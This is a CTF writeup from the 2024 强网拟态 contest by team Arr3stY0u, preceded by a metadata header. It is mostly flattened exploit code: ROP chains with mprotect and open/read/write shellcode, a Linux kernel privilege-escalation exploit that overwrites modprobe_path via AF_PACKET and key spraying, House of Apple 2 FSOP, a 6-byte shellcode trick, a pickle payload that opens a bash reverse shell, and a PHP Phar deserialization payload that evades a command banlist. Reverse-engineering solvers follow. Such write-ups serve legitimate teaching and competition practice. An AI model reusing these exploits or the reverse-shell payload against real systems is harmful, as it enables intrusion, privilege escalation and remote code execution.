---
title: 强网拟态 2024 writeup - Arr3stY0u
contest: 强网拟态 2024
year: 2024
difficulty: hard
vuln_type: deserialize
tags:
- srand(0)爆破
- libc_read_leak
- mprotect
- ORW_shellcode
- /proc/self/maps泄露
- one_gadget
- kernel键
- packet_socket
- modprobe_path
- shellcode拼图
- 0x18a6断点
- XTEA魔改
- claripy符号执行
- libServ1ce.so
- CapooObj__wakeup
- Phar反序列化
- pickle__reduce__
attack_chain: Pwn1:cdll.srand(0)+cdll.rand()%100+1爆破 → 栈溢出+libc read leak+pop_rdi+read+libc mprotect RWX+open/read/write /flag shellcode → Pwn2:5次0+i输入+管理员0x6b8b4567登录+读/proc/self/maps+one_gadget+system+bin_sh → Kernel:unshare(CLONE_NEWUSER|NEWNS|NEWNET)+AF_PACKET socket+TPACKET_V3 PACKET_RX_RING+add_key/keyctl_read喷+add 0x21d8000写modprobe_path → Pwn4:6字节shellcode写+pop fs:[rsi]栈+open/read/write /flag → Pwn6:House of Apple 2 _IO_wfile_jumps 0x48+stderr+system → Web:pickle __reduce__反弹shell → PHP CapooObj __wakeup正则banlist过滤(l$1s$IFS/绕)+Phar反序列化 → Android:libServ1ce.so JNI check+inp[i]^keyarray[i])*num+enc_flag + claripy符号执行 → Re:XTEA 0x66轮魔改+add 40+xor 0x7F
key_payload: srand(0)+cdll.rand()%100+1 + AF_PACKET TPACKET_V3 modprobe_path + 6字节shellcode pop fs:[rsi] + l$1s$IFS/ 绕空banlist
one_liner: 强网拟态2024 Arr3stY0u全方向7题:栈溢出ROP+House of Apple 2/内核AF_PACKET modprobe_path/6字节shellcode/Pickle反序列化/CapooObj Phar/Android JNI XTEA。
lesson: srand(0)+rand()%100+1=1..100可爆破验证;AF_PACKET socket+TPACKET_V3 PACKET_RX_RING堆喷+add_key keyring+改modprobe_path经典内核提权;6字节shellcode可用pop fs:[rsi]+syscall;CapooObj正则banlist含" "可用$IFS绕;libServ1ce.so JNI check函数做inp[i]^keyarray[i]*num+enc_flag验证,claripy符号执行求解;XTEA魔改OP=0x66轮+add 40+xor 0x7F。
quality: high
full_path: 强网拟态_2024_writeup_by_Arr3stY0u.full.md
meta_path: 强网拟态_2024_writeup_by_Arr3stY0u.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 强网拟态 2024 writeup - Arr3stY0u。强网拟态2024 Arr3stY0u全方向7题:栈溢出ROP+House of Apple 2/内核AF_PACKET modprobe_path/6字节shellcode/Pickle反序列化/CapooObj Phar/Android JNI XTEA。。经验：srand(0)+rand()%100+1=1..100可爆破验证;...
category: misc
subcategory: misc_other
tools_used:
- PHP
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/210838.html
wp_author: Arr3stY0u
reasoning_chain:
- 强网拟态 2024 Arr3stY0u 全方向 7 题：栈溢出 / House of Apple 2 / 内核 AF_PACKET modprobe_path / 6 字节 shellcode / Pickle 反序列化 / CapooObj Phar / Android JNI XTEA → 触发点：跨内核与跨语言
- Pwn1：cdll.srand(0) + cdll.rand()%100+1 爆破 1..100 输入 → 栈溢出 + libc read leak + pop_rdi + read + libc mprotect RWX + open/read/write /flag shellcode → 假设：srand 种子 = 0 可重放
- Pwn2：5 次 0+i 输入 + 管理员 0x6b8b4567 登录 + 读 /proc/self/maps + one_gadget + system + bin_sh
- Kernel：unshare(CLONE_NEWUSER|NEWNS|NEWNET) + AF_PACKET socket + TPACKET_V3 PACKET_RX_RING + add_key/keyctl_read 喷 + add 0x21d8000 写 modprobe_path → 动作：内核 UAF/CVE 经典流程
- Pwn4：6 字节 shellcode 写 + pop fs:[rsi] 栈 + open/read/write /flag
- Pwn6：House of Apple 2 _IO_wfile_jumps 0x48 + stderr + system
- Web Pickle：__reduce__ 反弹 shell
- PHP CapooObj：__wakeup 正则 banlist 过滤 (l$1s$IFS/ 绕空 banlist) + Phar 反序列化
- Android：libServ1ce.so JNI check + inp[i]^keyarray[i] * num + enc_flag + claripy 符号执行
- Re：XTEA 0x66 轮魔改 + add 40 + xor 0x7F
failed_attempts:
- Pwn1 直接爆破 100 → 失败：必须用 ctypes 与目标同步 srand
- Kernel 用普通 socket → 失败：必须 AF_PACKET + TPACKET_V3
- 6 字节尝试 push rsi → 失败：必须 pop fs:[rsi]
- CapooObj 直接传 '__' → 失败：banlist 过滤，连 _ 都拦
- Android JNI 暴力穷举 → 失败：claripy 符号执行求 key
key_observations:
- srand(0)+rand()%100+1 = 1..100 可爆破验证（ctypes 与目标共享 libc）
- AF_PACKET + TPACKET_V3 PACKET_RX_RING + add_key + 改 modprobe_path 经典内核提权
- 6 字节 shellcode 可用 pop fs:[rsi] + syscall = 突破长度限制
- CapooObj 正则 banlist 含空格可用 $IFS 绕
- Android JNI claripy 符号执行求 key + XTEA 魔改 OP=0x66 轮 + xor 0x7F
prerequisites:
- glibc heap / fastbin / tcache
- AF_PACKET 内核漏洞利用
- House of Apple 2 FSOP
- Android JNI + claripy 符号执行
---
# 强网拟态 2024 writeup by Arr3stY0u

> 原文: https://www.ctfiot.com/210838.html
> ID: 210838

from pwn import *from ctypes import *io = process('./vuln')elf = ELF('./vuln')context(log_level='debug',arch='amd64',os='linux')#io = remote("pwn-529731b787.challenge.xctf.org.cn", 9999, ssl=True)libc = ELF('./libc.so.6')
io.send(b'x00'*0x12)
cdll = CDLL('./libc.so.6')cdll.srand(0)for i in range(100): io.recvuntil('Input the authentication code:n') io.send(p64(cdll.rand()%100+1))io.recvuntil(b'>> n')io.send(p32(1))io.recvuntil(b'Index: ')io.send(p32(1))io.recvuntil(b'Note: ')io.send(b'a'*0x100)pop_rdi = 0x401893fake_rbp = 0x4042A0io.send(b'a'*0x100 + p64(fake_rbp) + p64(pop_rdi) + p64(elf.got['read']) + p64(elf.sym["puts"]) + p64(0x4013CF))io.recvuntil(b'x0a')libcbase = u64(io.recv(6).ljust(8,b'x00'))-libc.sym["read"]
pop_rdi = libcbase+libc.search(asm("pop rdinret")).__next__()pop_rsi = libcbase+libc.search(asm("pop rsinret")).__next__()pop_rdx_r12 = libcbase+libc.search(asm("pop rdxnpop r12nret")).__next__()mprotect = libcbase + libc.sym['mprotect']
payload = b'b'*0x108 + p64(pop_rdx_r12)+p64(0x700) + p64(0) + p64(elf.plt['read'])io.send(payload)payload = b'a'*0x128payload += p64(pop_rdi) + p64(fake_rbp&0xfff000) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx_r12) + p64(7)*2 + p64(mprotect)payload += p64(fake_rbp+0x70)payload +=asm(shellcraft.open("/flag")+shellcraft.read(3,fake_rbp+0x200,0x50)+shellcraft.write(1,fake_rbp+0x200,0x50))
io.send(payload)io.interactive()

#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwncli import *context(arch='amd64', os='linux', log_level='debug')
# use script mode#cli_script()io=gift['io']=remote()libc=gift['libc']=ELF('./libc.so.6')elf=gift['elf']=ELF("./vuln")

pop_rdi=0x0000000000401393leave_ret=0x4012EEbss_addr=0x404060

payload=b'a'*0x108+p64_ex(pop_rdi)+p64_ex(elf.got['puts'])+p64_ex(elf.plt['puts'])+p64_ex(0x4012C0)sa(b"lets move and pwn!",payload)
set_current_libc_base_and_log(recv_current_libc_addr(),libc.symbols['puts'])CG.set_find_area(find_in_elf=False,find_in_libc=True)
payload=b'a'*0x100+p64_ex(bss_addr+0x200-8)+p64_ex(CG.pop_rsi_ret())+p64_ex(bss_addr+0x200)+p64_ex(elf.plt['read'])+p64_ex(leave_ret)s(payload)
payload=flat( pop_rdi,bss_addr&(~0xfff),CG.pop_rsi_ret(),0x2000,CG.pop_rdx_ret(),7,libc.symbols['mprotect'], bss_addr+0x200+0x40)payload=payload+asm(shellcraft.open("/flag",0)+shellcraft.read(3,bss_addr+0x100,0x50)+shellcraft.write(1,bss_addr+0x100,0x50))s(payload)
ia()

#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwncli import *context(arch='amd64', os='linux', log_level='debug')

io=gift['io']=remote()libc=gift['libc']=ELF('./libc.so.6')

for i in range(5): sla(b':','0 '+str(i))
sa(b"Do you think this victory is easy? Is there anything you want to say?",b'x08'*9+b'x35')sa(b"Do you want to end the game [Y/N]",b'N ')sla(b':',b'0 15')sla(b"Please enter the administrator key",str(0x6b8b4567))
sla(b"[*] Administrator successfully logged in!n",b'/proc/self/maps')data=ru(b'r-xp 00000000 fd:00 3237109669 /lib/')set_current_libc_base_and_log(int(data[-78:-66],16),0)one_gadget=get_current_one_gadget_from_libc()[0]
CG.set_find_area(find_in_libc=True,find_in_elf=False)for i in range(5): sla(b':','0 '+str(i))sa(b"Do you think this victory is easy? Is there anything you want to say?",p64_ex(libc.address+0x1425e1)*2+p64_ex(libc.address+0x2164f)*2+p64_ex(CG.bin_sh())+p64_ex(libc.symbols['system']))sa(b"Do you want to end the game [Y/N]",b'N ')sla(b':',b'0 15')
#./pwn2 -c test flag

ia()

#define _GNU_SOURCE#include <sys/types.h>#include <stdio.h>#include #include <fcntl.h>#include <stdint.h>#include <sys/syscall.h>#include <sched.h>#include <linux/if_ether.h>#include <linux/if_packet.h>#include <sys/mman.h>#include <sys/socket.h>#include <linux/keyctl.h>
#define COLOR_GREEN " 33[32m"#define COLOR_RED " 33[31m"#define COLOR_YELLOW " 33[33m"#define COLOR_DEFAULT " 33[0m"
#define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "n", __FILE__, __LINE__, ##__VA_ARGS__)#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)#define die(fmt, ...) do { loge(fmt, ##__VA_ARGS__); loge("Exit at line %d", __LINE__); exit(1); } while (0)
void bind_core(int core){ cpu_set_t cpu_set;
 CPU_ZERO(&cpu_set); CPU_SET(core, &cpu_set); sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
 logi("Process binded to core %d", core);}
int fd = 0;u_int64_t heap_addr = 0, kbase_addr = 0;
typedef struct edit{ char *content;} edit_arg;
void add(char *content){ edit_arg tmp = { .content = content, };
 ioctl(fd, 0x20, &tmp);}
void edit(char *content){ edit_arg tmp = { .content = content, };
 ioctl(fd, 0x50, &tmp);}
void delete(char *content){ edit_arg tmp = { .content = content, };
 ioctl(fd, 0x30, &tmp);}
void unshare_setup(){ int temp_fd; uid_t uid = getuid(); gid_t gid = getgid(); char buffer[0x100];
 if (unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWNET)) { die("unshare(CLONE_NEWUSER | CLONE_NEWNS)"); }
 temp_fd = open("/proc/self/setgroups", O_WRONLY); write(temp_fd, "deny", strlen("deny")); close(temp_fd);
 temp_fd = open("/proc/self/uid_map", O_WRONLY); snprintf(buffer, sizeof(buffer), "0 %d 1", uid); write(temp_fd, buffer, strlen(buffer)); close(temp_fd);
 temp_fd = open("/proc/self/gid_map", O_WRONLY); snprintf(buffer, sizeof(buffer), "0 %d 1", gid); write(temp_fd, buffer, strlen(buffer)); close(temp_fd); return;}
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr){ struct tpacket_req req; int socket_fd, version; int ret;
 socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET); if (socket_fd < 0) { printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)n"); ret = socket_fd; goto err_out; }
 version = TPACKET_V1; ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)); if (ret < 0) { die("[x] failed at setsockopt(PACKET_VERSION)n"); goto err_setsockopt; }
 memset(&req, 0, sizeof(req)); req.tp_block_size = size; req.tp_block_nr = nr; req.tp_frame_size = 0x1000; req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
 ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)); if (ret < 0) { die("[x] failed at setsockopt(PACKET_TX_RING)n"); goto err_setsockopt; }
 return socket_fd;
err_setsockopt: close(socket_fd);err_out: return ret;}int packet_socket_setup(uint32_t block_size, uint32_t frame_size, uint32_t block_nr, uint32_t sizeof_priv, int timeout){ int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)); if (s < 0) { perror("[-] socket (AF_PACKET)"); exit(1); }
 int v = TPACKET_V3; int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v)); if (rv < 0) { perror("[-] setsockopt (PACKET_VERSION)"); exit(1); }
 struct tpacket_req3 req3; memset(&req3, 0, sizeof(req3)); req3.tp_sizeof_priv = sizeof_priv; req3.tp_block_nr = block_nr; req3.tp_block_size = block_size; req3.tp_frame_size = frame_size; req3.tp_frame_nr = (block_size * block_nr) / frame_size; req3.tp_retire_blk_tov = timeout; req3.tp_feature_req_word = 0;
 rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req3, sizeof(req3)); if (rv < 0) { perror("[-] setsockopt (PACKET_RX_RING)"); exit(1); }
 struct sockaddr_ll sa; memset(&sa, 0, sizeof(sa)); sa.sll_family = PF_PACKET; sa.sll_protocol = htons(ETH_P_ALL); sa.sll_ifindex = if_nametoindex("lo"); sa.sll_hatype = 0; sa.sll_halen = 0; sa.sll_pkttype = 0; sa.sll_halen = 0;
 rv = bind(s, (struct sockaddr *)&sa, sizeof(sa)); if (rv < 0) { perror("[-] bind (AF_PACKET)"); exit(1); }
 return s;}
int key_alloc(char *description, char *payload, size_t plen){ return syscall(__NR_add_key, "user", description, payload, plen, KEY_SPEC_PROCESS_KEYRING);}
int key_read(int keyid, char *buffer, size_t buflen){ return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);}
char page_tmp[0x10000];
void main(){ char tmp[0x28]; char payload[0x10];
 int key_id[0x50]; bind_core(0); unshare_setup(); fd = open("/dev/ker", O_RDONLY); if (fd < 0) { die("opne /dev/ker error"); }
 add(tmp); delete (tmp);
 key_id[0] = key_alloc(tmp, payload, 0x10);
 delete (tmp);
 int block_nr = 0x28 / 0x8; int packet_fds = packet_socket_setup(0x1000, 0x800, block_nr, 0, 1000);
 key_read(key_id[0], page_tmp, 0xf000); size_t ptr = page_tmp; while (kbase_addr == 0) { u_int64_t tmp = *(size_t *)ptr; if ((tmp & 0xfff) == 0x1d0 && tmp > 0xFFFFFFFF00000000) { kbase_addr = tmp - 0x17741d0; } ptr += 8; if (ptr == page_tmp + 0xf000) { die("error"); } } logi("kbase_addr :0x%llx", kbase_addr);
 *(size_t *)tmp = kbase_addr + 0x21d8000; edit(tmp); char *page = mmap(NULL, 0x1000 * block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, packet_fds, 0); if (page < 0) { die("page"); }
 memcpy(page + 0xce0, "/tmp/modprobe", 14);
 system("echo -ne '\xff\xff\xff\xff' > /tmp/dummy"); system("echo '#!/bin/shnchmod 777 /flag' > /tmp/modprobe"); system("chmod +x /tmp/modprobe"); system("chmod +x /tmp/dummy");
 system("/tmp/dummy");}

from pwn import *

exe = './vuln'# context.terminal = ['wt.exe', 'wsl.exe', 'bash', '-c']context.binary = ELF(exe, False)binary: ELF = context.binary
# libc: ELF = ELF('./libc.so.6', False)
REMOTE = args.REMOTE or 0if REMOTE: p = remote("", 9999, ssl=True)else: p = process(exe)sd, sa, sl, sla = p.send, p.sendafter, p.sendline, p.sendlineafterrn, rl, ru, ia = p.recvn, p.recvline, p.recvuntil, p.interactive
shellcode = bytes.fromhex('66be000364488b2631c031ff4889e60f05585f5e5ac3')if not shellcode: code = ''' mov si, 0x300 mov rsp, fs:[rsi] xor eax, eax xor edi, edi mov rsi, rsp syscall pop rax pop rdi pop rsi pop rdx ret ''' shellcode = asm(code) print(shellcode.hex())hexcode = shellcode.hex()print(len(shellcode))assert len(shellcode) <= 22, len(shellcode)
# gdb.attach(p, 'brva 0x18a6nc')sla(b'input:', ('{"shellcode":"'+hexcode+'"}').encode())
payload = flat([ # rax rdi rsi rdx constants.SYS_write, 1, 0xdeadbeef, 0x100, 0x999800c, constants.SYS_read, 0, 0xdeadbeef, 0x1000, 0x999800c,])sla(b'loaded!n', payload)
dump = rn(0x100)print(hexdump(dump))stack = u64(dump[0x58:
0x60])rsp_addr = stack-0xa8print(hex(rsp_addr))
syscall_addr = 0x999800f
payload = flat({ 0x00: [ # rax rdi rsi rdx constants.SYS_open, rsp_addr+0x100, 0, 0x4000, syscall_addr, # open('rsp', 'O_RDONLY', 0x4000) constants.SYS_read, 3, rsp_addr+0x200, 50, syscall_addr, constants.SYS_write, 1, rsp_addr+0x200, 50, syscall_addr, ], 0x100: b'/flagx00'})sd(payload)
ia()

#!/usr/bin/env python3'''Author:
7resp4ssDate:
2024-10-19 20:55:
09Usage: Debug : python3 exp.py debug elf-file-path -t -b malloc Remote: python3 exp.py remote elf-file-path ip:
port'''
from pwncli import *cli_script()

io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc
filename = gift.filename # current filenameis_debug = gift.debug # is debug or not is_remote = gift.remote # is remote or notgdb_pid = gift.gdb_pid # gdb pid if debug
if gift.remote: libc = ELF("./libc.so.6") gift[libc] = libc

def cmd(i, prompt=">"): sla(prompt, str(i))
def add(i,sz): cmd('1') sla("[+] input your index",str(i)) sla("[+] input your size",str(sz)) #......
def edit(i,cont): cmd('2') sla("[+] input your index",str(i)) sla("content",cont)
 #......
def show(i): cmd('4') sla("[+] input your index",str(i)) #......
def dele(i): cmd('3') sla("[+] input your index",str(i)) #......
add(0,0x500)add(1,0x500)dele(0)show(0)lb = recv_current_libc_addr(0x21ace0,0x100)libc.address = lb add(0xe,0x700)io_attack = IO_FILE_plus_struct().house_of_apple2_execmd_when_exit(libc.sym._IO_2_1_stderr_, libc.sym._IO_wfile_jumps, libc.sym.system, "sh")
edit("-4",io_attack)sl("5")
ia()

import pickleimport os
class MaliciousCommand: def __reduce__(self): # 返回一个元组，表示调用 eval 执行的命令 return (os.system, ("bash -c 'bash -i >& /dev/tcp/55555/5555 0>&1'",))
# 创建一个包含恶意命令的对象
def create_malicious_object(): malicious_object = MaliciousCommand() data = { 'malicious_command': malicious_object } return data
def create_pickle_file(filename): data_to_pickle = create_malicious_object()
 with open(filename, 'wb') as f: pickle.dump(data_to_pickle, f)
create_pickle_file('malicious.pkl')代码解析：导入库：
python复制代码import pickleimport os仅导入了 pickle 和 os 库。
定义恶意命令的类：
python复制代码
class MaliciousCommand: def __reduce__(self): return (os.system, ("bash -c 'bash -i >& /dev/tcp/1/6969 0>&1'",))MaliciousCommand 类实现了 __reduce__ 方法，返回一个元组，其中包含 os.system 和要执行的命令字符串。这样，当该对象被反序列化时，命令将会执行。
创建包含恶意对象的函数：
python复制代码
def create_malicious_object(): malicious_object = MaliciousCommand() data = { 'malicious_command': malicious_object } return data该函数实例化 MaliciousCommand，并将其包含在一个字典中。
创建 pickle 文件的函数：
python复制代码
def create_pickle_file(filename): data_to_pickle = create_malicious_object()
 with open(filename, 'wb') as f: pickle.dump(data_to_pickle, f)这个函数调用 create_malicious_object，然后将生成的数据序列化并写入指定的文件。
调用创建文件的函数：
python复制代码create_pickle_file('malicious.pkl')最后，调用该函数生成包含恶意代码的 pickle 文件。
注意这段代码仅用于教育目的，展示了如何构建可能的安全漏洞。在实际应用中，绝对不要使用这种方法，特别是处理不可信数据时。相应的安全措施和最佳实践应始终得以遵循。

<?php
class CapooObj { public function __wakeup(){ $action = $this->action; $action = str_replace(""", "", $action); $action = str_replace("'", "", $action); $banlist = "/(flag|php|base|cat|more|less|head|tac|nl|od|vi|sort|uniq|file|echo|xxd|print|curl|nc|dd|zip|tar|lzma|mv|www|~|`|r|n|t| |^|ls|.|tail|watch|wget|||;|:|(|)|{|}|*|?|[|]|@|\|=|<)/i"; if(preg_match($banlist, $action)){ die("Not Allowed!"); } system($this->action); }}header("Content-type:
text/html;charset=utf-8");if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['capoo'])) { $file = $_POST['capoo']; if (file_exists($file)) { $data = file_get_contents($file); $base64 = base64_encode($data); } else if (substr($file, 0, strlen("http://")) === "http://") { $data = file_get_contents($_POST['capoo'] . "/capoo.gif"); if (strpos($data, "PILER") !== false) { die("Capoo piler not allowed!"); } file_put_contents("capoo_img/capoo.gif", $data); die("Download Capoo OK"); } else { die('Capoo does not exist.'); }} else { die('No capoo provided.');}?><!DOCTYPE html><html> <head> <title>Display Capoo</title> </head>  ' /> </html>

<?php
class CapooObj{ public $action = 'l$1s$IFS/';}$phar = new Phar('9.phar');
$phar -> stopBuffering();$phar -> setStub('test'.'<?php __HALT_COMPILER();?>');$phar -> addFromString('test.txt','test');
$object = new CapooObj();$phar -> setMetadata($object);$phar -> stopBuffering();

import hashlib
def generate_md5(number): return hashlib.md5(str(number).encode()).hexdigest()
md5_dict = {str(i): generate_md5(i) for i in range(1, 1000000)}
file_path = './dic.txt'with open(file_path, 'w') as file: for key, value in md5_dict.items(): file.write(f"{value}n")

package com.nobody.Serv1ce;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.widget.Toast;
/* loaded from: classes.dex */public class MyService extends Service { private String input; private String key = "1liIl11lIllIIl11llII"; private byte[] keyarray = new byte[64]; int num = 9;
 private native boolean check(String str, byte[] bArr, int i);
 static { System.loadLibrary("Serv1ce"); }
 @Override // android.app.Service public void onCreate() { this.num++; super.onCreate(); }
 @Override // android.app.Service public int onStartCommand(Intent intent, int i, int i2) { this.num++; for (int i3 = 0; i3 < 64; i3++) { byte[] bArr = this.keyarray; String str = this.key; bArr[i3] = (byte) (((str.charAt(i3 % str.length()) - 'w') ^ 23) & 255); } if (intent != null) { this.input = intent.getStringExtra("input"); Toast.makeText(getApplicationContext(), "Input Success", 1).show(); } super.onStartCommand(intent, i, i2); return i; }
 @Override // android.app.Service public IBinder onBind(Intent intent) { throw new UnsupportedOperationException("Not yet implemented"); }
 @Override // android.app.Service public void onDestroy() { if (check(this.input, this.keyarray, this.num)) { Toast.makeText(getApplicationContext(), "You Are Right", 1).show(); } else { Toast.makeText(getApplicationContext(), "Wrong", 1).show(); } super.onDestroy(); }}

// libServ1ce.so
__int64 __fastcall Java_com_nobody_Serv1ce_MyService_check(JNIEnv *a1, __int64 a2, void *a3, void *a4, char num){ // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]
 v14 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40); inp = (*a1)->GetStringUTFChars(a1, a3, v13); key = (*a1)->GetByteArrayElements(a1, a4, v13); if ( strlen(inp) == 36LL ) { i = 0LL; while ( 1 ) { v11 = (inp[i] ^ key[i]) * num; inp[i] = v11; if ( enc_flag[i] != v11 ) break; if ( ++i == 36 ) return 1LL; } } return 0LL;}

from claripy import *
key = b"1liIl11lIllIIl11llII"keyarray = bytearray(64)
enc_flag = bytearray.fromhex('B932C2D469D5CAFBF8FB807CD4E593D51C8BF8DFDAA111F8A19393C27C8B1C66013DA367')for i in range(64): keyarray[i] = ((key[i%len(key)]-ord('w'))^23)&0xFF
inp = [BVS('', 8) for i in range(len(enc_flag))]tmp = [None]*len(inp)num = 11for i in range(len(inp)): tmp[i] = ((inp[i]^keyarray[i])*num)&0xFFs = Solver()for i in range(len(tmp)): s.add(tmp[i] == enc_flag[i])for x in s.batch_eval(inp, 2): print(bytes(x))

import struct
ROUND = 0x66DELTA = 0x9E3779B9

def xtea_decrypt(v0, v1, key): _sum = (DELTA*ROUND) & 0xFFFFFFFF for i in range(ROUND): # v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + k[(sum >> 11) & 3]); t0 = (v0 << 4) & 0xFFFFFFFF t0 ^= 0x88F5736E
 t1 = v0 >> 5 t1 ^= 0x99AD88A7
 t2 = t1 ^ t0 t2 ^= 0x1158FBC9
 t2 += v0 t2 &= 0xFFFFFFFF t2 ^= 0x44EEEFEA
 t3 = (_sum + key[(_sum >> 11) & 3]) & 0xFFFFFFFF t3 ^= 0xFB4E3E5D
 v1 -= t2 ^ t3 ^ 0xbfa0d1b7 v1 &= 0xFFFFFFFF
 _sum -= DELTA _sum &= 0xFFFFFFFF
 # v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + k[sum & 3]); t0 = v1 << 4 t0 ^= 0x48130B32
 t1 = v1 >> 5 t1 ^= 0xD4ACF437
 t2 = t1 ^ t0 t2 ^= 0x9CBFFF05 t2 += v1 t2 &= 0xFFFFFFFF t2 ^= 0x1CDCBBA3
 t3 = ((_sum+key[_sum & 3]) ^ 0x939142A0) & 0xFFFFFFFF v0 -= t2 ^ t3 ^ 0x8f4df903 v0 &= 0xFFFFFFFF
 return v0, v1
# add 40
# xor 7f

tmp = bytes.fromhex( 'A1E35198865676496F6B2B81CFCE1296A270353C31625CF1FA776BAA9E6D05BEE824A4F8DB233A0B1620CC03ADB52BA9349F781D2EB9F99E')key = [0xEF6FD9DB, 0xD2C273D3, 0x6F97E412, 0x72BFD624]
data = list(struct.unpack('<14I', tmp))for i in range(0, 14, 2): data[i], data[i+1] = xtea_decrypt(data[i], data[i+1], key)
tmp = bytearray(struct.pack('<14I', *data))for i in range(len(tmp)): tmp[i] ^= 0x7Ffor i in range(len(tmp)): tmp[i] = (tmp[i]-0x40) & 0xFF
print(tmp)
# flag{u_ar3_re@11y_g00d_@t_011vm_de0bf_and_anti_debugger}

void __fastcall sub_14001FA60(__int64 a1, __int64 a2, __int64 a3){ // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]
 v3 = &v18; for ( i = 134i64; i; --i ) { *(_DWORD *)v3 = -858993460; v3 += 4; } j___CheckForDebuggerJustMyCode(&unk_14005A102); memset(Data, 0, 0xFFui64); cbData[0] = 255; v5 = j_decrypt_string(byte_14004E538); // Software\PacManX Value = RegOpenKeyExA(HKEY_CURRENT_USER, v5, 0, 0x20019u, &hKey); if... v8 = j_decrypt_string(s_MYFLAG); // MYFLAG Value = RegQueryValueExA(hKey, v8, 0i64, (LPDWORD)Type, Data, (LPDWORD)cbData); if... if ( j_strlen((const char *)Data) != 36 ) { v11 = j_decrypt_string(s_Error); v12 = sub_1400141C7(std::
cerr, v11); std::
ostream::
operator<<(v12, sub_140014096); exit(0); } RegCloseKey(hKey); Buffer = malloc(0xFC64ui64); v13 = j_decrypt_string(byte_14004E590); // game.data Stream = fopen(v13, "rb"); v14 = j_decrypt_string(&OldFilename); // game.tmp v26 = fopen(v14, "w"); fread(Buffer, 1ui64, 0xC2DBui64, Stream); nonce = j_decrypt_string(byte_14004E580); // powerpowerpo v15 = (unsigned int)j_decrypt_string(byte_14004E558);// powerpowerpowerpowerpowerpowerpo chacha_enc((int)Buffer, 64614, v15, (int)nonce, 0); fwrite(Buffer, 1ui64, 0xC2DBui64, v26); fclose(Stream); fclose(v26); v16 = j_decrypt_string(&FileName); // game.ps1 rename(&OldFilename, v16); // powershell.exe -File game.ps1 v17 = j_decrypt_string(byte_14004E5C0); system(v17); remove(&FileName);}

from Crypto.Cipher import ChaCha20
cipher = ChaCha20.new(key=b'powerpowerpowerpowerpowerpowerpo', nonce=b'powerpowerpo')
a = cipher.encrypt(open('./game.data', 'rb').read())print(a)
open('./ps1.data', 'wb').write(a)

function enenenenene { param( $plaintextBytes, $keyBytes ) # Initialize S and KSA $S = 0..255 $j = 0 for ($i = 0; $i -lt 256; $i++) { $j = ($j + $S[$i] + $keyBytes[$i % $keyBytes.Length]) % 256 $temp = $S[$i] $S[$i] = $S[$j] $S[$j] = $temp }
 # PRGA and encryption $i = 0 $j = 0 $ciphertextBytes = @() for ($k = 0; $k -lt $plaintextBytes.Length; $k++) { $i = ($i + 1) % 256 $j = ($j + $S[$i]) % 256 $temp = $S[$i] $S[$i] = $S[$j] $S[$j] = $temp $t = ($S[$i] + $S[$j]) % 256 $ciphertextBytes += ($plaintextBytes[$k] -bxor $S[$t]) }
 # Return ciphertext as a string return $ciphertextBytes}function enenenenene1 { param( $inputbyte ) $key = @(0x70, 0x6f, 0x77, 0x65, 0x72) $encryptedText = @(); for ($k = 0; $k -lt $inputbyte.Length; $k++) { $encryptedText = enenenenene -plaintextBytes $inputbyte -keyBytes $key; $key = enenenenene -plaintextBytes $key -keyBytes $encryptedText; } return $encryptedText + $key;}function enenenenene2 { param( $inputbyte ) $key = @(0x70, 0x30, 0x77, 0x65, 0x72) for ($k = 0; $k -lt $inputbyte.Length; $k++) { $inputbyte[$k] = $inputbyte[$k] + $key[$k % $key.Length] } return $inputbyte;}function enenenenene3 { param( $inputbyte ) $key = @(0x70, 0x30, 0x77, 0x33, 0x72) for ($k = 0; $k -lt $inputbyte.Length; $k++) { $inputbyte[$k] = $inputbyte[$k] * $key[$k % $key.Length] } return $inputbyte;}$registryPath = 'HKCU:
SoftwarePacManX'
$valueName = 'MYFLAG'$value = Get-ItemPropertyValue $registryPath $valueName$plaintext = @($value) | ForEach-Object { $input = $_ $plaintext = @() for ($i = 0; $i -lt $input.Length; $i++) { $plaintext += [int][char]$input[$i] } $plaintext}
